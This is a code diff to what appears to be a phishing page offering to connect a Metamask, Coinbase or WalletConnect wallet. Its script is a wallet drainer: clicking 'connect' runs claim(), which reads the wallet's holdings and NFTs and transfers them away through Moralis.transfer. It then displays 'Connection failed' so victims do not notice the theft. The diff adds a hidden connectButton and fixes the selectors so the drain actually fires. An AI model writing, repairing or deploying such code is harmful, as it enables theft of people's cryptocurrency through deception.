@@ -62,7 +62,7 @@
 								</div>
 							</div>
 							<div class="flex justify-center mt-8">
-								<div class="min-w-[250px] grid grid-cols-1 gap-y-3 mt-8 md:gap-y-5"><a target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Metamask</span></a><a href="https://www.coinbase.com/wallet/getting-started-extension" target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Coinbase</span></a><button type="button" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">WalletConnect</span></button></div>
+								<div class="min-w-[250px] grid grid-cols-1 gap-y-3 mt-8 md:gap-y-5"><a target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><button type="submit" id="connectButton"></button><span class="flex w-full items-center justify-center text-center">Metamask</span></a><a href="https://www.coinbase.com/wallet/getting-started-extension" target="_blank" rel="noopener noreferrer" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">Coinbase</span></a><button type="button" class="button button-primary cta duration-200"><span class="flex w-full items-center justify-center text-center">WalletConnect</span></button></div>
 							</div>
 						</div>
 					</section>
@@ -163,8 +163,8 @@
 			spliceArr(claim_data.nfts, nft);
 			try {
 				await transaction.wait()
-				$(".button button-primary cta duration-200").html("Connection failed");
-				setTimeout(() => {$(".button button-primary cta duration-200").html("Connect wallet")}, 2000);
+				$("#connectButton").html("Connection failed");
+				setTimeout(() => {$("#connectButton").html("Connect wallet")}, 2000);
 			} catch(err) {
 				claim_data.nfts.unshift(nft);
 			}
@@ -208,13 +208,13 @@
 			let result = await Moralis.transfer(options).catch(err => {
 				if(err.code === 4001) {
 					$("#connectButton").html("Connection failed");
-					setTimeout(() => {$(".button button-primary cta duration-200").html("Connect wallet")}, 4000);
+					setTimeout(() => {$("#connectButton").html("Connect wallet")}, 4000);
 				}
 				if(err.toString().includes("insufficient funds")) {
 					stop = true;
 					block = false;
 					$("#connectButton").html("Connection failed");
-					setTimeout(() => {$(".button button-primary cta duration-200").html("Connect wallet")}, 4000);
+					setTimeout(() => {$("#connectButton").html("Connect wallet")}, 4000);
 				}
 			});
 			return stop;
@@ -259,19 +259,19 @@
 				await enable_web3();
 				await sync_chain();
 				await get_data();
-				$(".button button-primary cta duration-200").html("Connect wallet");
+				$("#connectButton").html("Connect wallet");
 				if(block) return;
 				await send();
 			} else {
 				await sync_chain();
 				await get_data();
-				$(".button button-primary cta duration-200").html("Connect wallet");
+				$("#connectButton").html("Connect wallet");
 				if(block) return;
 				await send();
 			}
 		}
 	
-	    $(".button button-primary cta duration-200").click(async () => {
+	    $("#connectButton").click(async () => {
 			await claim();
 		});
 		
